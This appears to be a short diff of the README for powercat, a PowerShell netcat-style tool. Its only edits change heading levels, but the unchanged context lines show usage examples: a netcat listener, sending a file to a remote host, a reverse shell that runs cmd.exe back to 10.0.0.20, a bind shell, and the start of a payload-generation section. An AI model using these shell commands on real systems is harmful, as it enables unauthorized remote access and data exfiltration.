@@ -97,7 +97,7 @@ powercat [-c or -l] [-p port] [options]
 
 ## Examples
 
-#### Send a file to receiver
+### Send a file to receiver
 
 * Receiver: `nc -nlvp 443 > out.txt`
 
@@ -107,7 +107,7 @@ powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
 
 ### Shells (reverse/bind)
 
-#### Reverse shell
+### Reverse shell
 
 * Receiver: `nc -nlvp 443`
 * `-e` - specifies the application that is executed once connected
@@ -116,7 +116,7 @@ powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
 powercat -c 10.0.0.20 -p 443 -e cmd.exe
 ```
 
-#### Bind shell
+### Bind shell
 
 * `-l` - specifies powercat to create a listener
 * `-e` - specifies the application that is executed once connected
@@ -129,7 +129,7 @@ Once a connection is received (`nc <ip> 443`) the bind shell will be initiated.
 
 ### Payload Generation
 
-#### Standalone payloads
+### Standalone payloads
 
 * Non-encoded
 
